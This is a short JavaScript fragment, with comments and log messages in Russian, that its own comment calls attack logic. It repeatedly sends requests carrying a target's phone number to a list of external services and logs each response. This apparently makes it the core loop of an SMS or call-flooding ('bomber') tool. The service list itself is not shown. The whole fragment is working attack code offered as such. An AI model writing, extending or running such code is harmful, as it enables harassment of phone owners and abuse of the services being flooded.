    // Логика атаки с выводом ошибок в логи
    for (let i = 0; i < repeats; i++) {
        for (const service of services) {
            try {
                const data = typeof service.data === 'function' ? service.data(phone) : service.data;
                const response = await axios({
                    method: service.method,
                    url: service.url,
                    headers: service.headers,
                    data: data,
                    timeout: 5000
                });
                console.log(`✅ Сервис ${service.url.substring(0, 30)}... ответил: ${response.status}`);
            } catch (e) {
                console.log(`❌ Ошибка на сервисе ${service.url.substring(0, 30)}... : ${e.message}`);
            }
        }
        await new Promise(r => setTimeout(r, 1500));
    }
